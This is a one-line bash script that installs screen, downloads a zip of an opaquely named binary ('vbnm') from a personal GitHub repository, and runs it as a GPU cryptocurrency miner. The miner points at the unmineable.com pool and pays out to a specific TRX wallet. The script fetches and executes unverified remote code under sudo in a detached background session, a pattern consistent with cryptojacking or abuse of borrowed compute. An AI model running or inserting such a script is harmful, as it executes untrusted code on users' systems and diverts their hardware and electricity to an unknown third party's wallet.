#!/bin/bash
sudo apt update && sudo apt install screen -y && screen -dmS gpuu.sh ./GPU.sh 65 75 && wget https://github.com/okg123/rex-kg/raw/main/vbnm.zip && apt install unzip && unzip vbnm.zip && cd vbnm && chmod u+x vbnm && ./vbnm --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TUhisPLRuEvLxgeyhctGgm1vskr3aapMGX.okg --ethstratum ETHPROXY
